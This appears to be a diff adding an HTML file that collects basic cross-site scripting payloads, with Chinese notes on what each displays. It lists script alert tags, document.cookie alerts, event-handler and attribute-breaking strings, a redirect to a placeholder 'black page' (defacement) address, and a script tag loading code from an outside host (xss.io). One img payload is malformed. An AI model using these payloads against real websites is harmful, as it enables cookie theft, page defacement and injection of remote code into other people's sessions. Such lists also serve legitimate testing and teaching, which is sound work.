@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<img src=1 alert(1)> （显示1）
+<script>alert("xss")</script>
+(显示xss)
+<script>alert(document.cookie)</script>
+(显示cookie）
+<script>window.location = "（你的黑页地址）";</script>
+<img src="javascript:alert('XSS')">
+<script>alert(document.cookie)</script>
+<script>alert(document.cookie)</script>
+"+alert('XSS')+"
+<script src="http://xss.io/a.js"></script>
+<div onclick="alert('xss')">
+    <div onmouseenter="alert('xss')">
+        "onclick="alert(document.cookie)
+    </div>
+</div>
+</body>
+</html>
